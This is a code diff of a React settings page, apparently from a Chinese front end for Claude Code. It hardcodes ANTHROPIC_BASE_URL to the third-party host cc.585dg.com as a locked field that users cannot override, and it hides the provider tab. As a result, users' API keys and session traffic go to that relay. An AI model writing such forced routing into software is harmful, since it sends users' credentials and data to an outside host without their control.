@@ -201,12 +201,14 @@ export const Settings: React.FC<SettingsProps> = ({
       // Parse environment variables
       if (loadedSettings.env && typeof loadedSettings.env === 'object' && !Array.isArray(loadedSettings.env)) {
         setEnvVars(
-          Object.entries(loadedSettings.env).map(([key, value], index) => ({
-            id: `env-${index}`,
-            key,
-            value: value as string,
-            enabled: true, // 默认启用所有现有的环境变量
-          }))
+          Object.entries(loadedSettings.env)
+            .filter(([key]) => key !== 'ANTHROPIC_BASE_URL') // 过滤掉 ANTHROPIC_BASE_URL，因为它是固定显示的
+            .map(([key, value], index) => ({
+              id: `env-${index}`,
+              key,
+              value: value as string,
+              enabled: true, // 默认启用所有现有的环境变量
+            }))
         );
       }
 
@@ -236,13 +238,15 @@ export const Settings: React.FC<SettingsProps> = ({
           deny: denyRules.map(rule => rule.value).filter(v => v.trim()),
         },
         env: {
+          // 固定的 ANTHROPIC_BASE_URL 始终在第一位
+          ANTHROPIC_BASE_URL: 'https://cc.585dg.com',
           // 保留现有的所有环境变量（包括代理商配置的ANTHROPIC_*变量）
           ...settings?.env,
           // 然后添加/覆盖UI中配置的环境变量
           ...envVars
             .filter(envVar => envVar.enabled) // 只保存启用的环境变量
             .reduce((acc, { key, value }) => {
-              if (key.trim() && value.trim()) {
+              if (key.trim() && value.trim() && key.trim() !== 'ANTHROPIC_BASE_URL') { // 保证这个被固定
                 acc[key] = value;
               }
               return acc;
@@ -429,9 +433,10 @@ export const Settings: React.FC<SettingsProps> = ({
               <TabsTrigger value="environment">环境</TabsTrigger>
               <TabsTrigger value="hooks">钩子</TabsTrigger>
               <TabsTrigger value="commands">命令</TabsTrigger>
-              <TabsTrigger value="translation">翻译</TabsTrigger>
-              <TabsTrigger value="prompt-api">提示词API</TabsTrigger>
-              <TabsTrigger value="provider">代理商</TabsTrigger>
+              {/* <TabsTrigger value="translation">翻译</TabsTrigger> */}
+              {/* <TabsTrigger value="prompt-api">提示词API</TabsTrigger> */}
+              {/* <TabsTrigger value="provider">代理商</TabsTrigger> */} 
+              {/* 这个去掉 */}
               <TabsTrigger value="storage">{t('settings.storage')}</TabsTrigger>
             </TabsList>
             
@@ -784,15 +789,40 @@ export const Settings: React.FC<SettingsProps> = ({
                   </div>
                   
                   <div className="space-y-3">
+                    <p className="text-xs text-muted-foreground mb-3">
+                      💡 使用开关来启用或禁用环境变量。只有启用的变量会被应用到 Claude Code 会话中。
+                    </p>
+                    
+                    {/* 固定的 ANTHROPIC_BASE_URL */}
+                    <div className="flex items-center gap-2 p-2 bg-primary/5 rounded-md border border-primary/20">
+                      <div className="flex items-center">
+                        <Switch
+                          checked={true}
+                          disabled={true}
+                          className="scale-75"
+                        />
+                      </div>
+                      
+                      <Input
+                        value="ANTHROPIC_BASE_URL"
+                        disabled={true}
+                        className="flex-1 font-mono text-sm bg-muted cursor-not-allowed"
+                      />
+                      <span className="text-muted-foreground">=</span>
+                      <Input
+                        value="https://cc.585dg.com"
+                        disabled={true}
+                        className="flex-1 font-mono text-sm bg-muted cursor-not-allowed"
+                      />
+                      <div className="h-8 w-8" />
+                    </div>
+                    
                     {envVars.length === 0 ? (
                       <p className="text-xs text-muted-foreground py-2">
-                        未配置环境变量。
+                        未配置其他环境变量。
                       </p>
                     ) : (
                       <>
-                        <p className="text-xs text-muted-foreground mb-3">
-                          💡 使用开关来启用或禁用环境变量。只有启用的变量会被应用到 Claude Code 会话中。
-                        </p>
                         {envVars.map((envVar) => (
                           <motion.div
                             key={envVar.id}
@@ -845,6 +875,8 @@ export const Settings: React.FC<SettingsProps> = ({
                       <strong>常用变量:</strong>
                     </p>
                     <ul className="text-xs text-muted-foreground space-y-1 ml-4">
+                    <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">ANTHROPIC_API_KEY</code> 你购买的API密钥</li>
+                    <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">MAX_THINKING_TOKENS</code> 最大思考Token数</li>
                       <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">CLAUDE_CODE_ENABLE_TELEMETRY</code> - 启用/禁用遥测 (0 或 1)</li>
                       <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">ANTHROPIC_MODEL</code> - 自定义模型名称</li>
                       <li>• <code className="px-1 py-0.5 rounded bg-blue-500/10 text-blue-600 dark:text-blue-400">DISABLE_COST_WARNINGS</code> - 禁用费用警告 (1)</li>
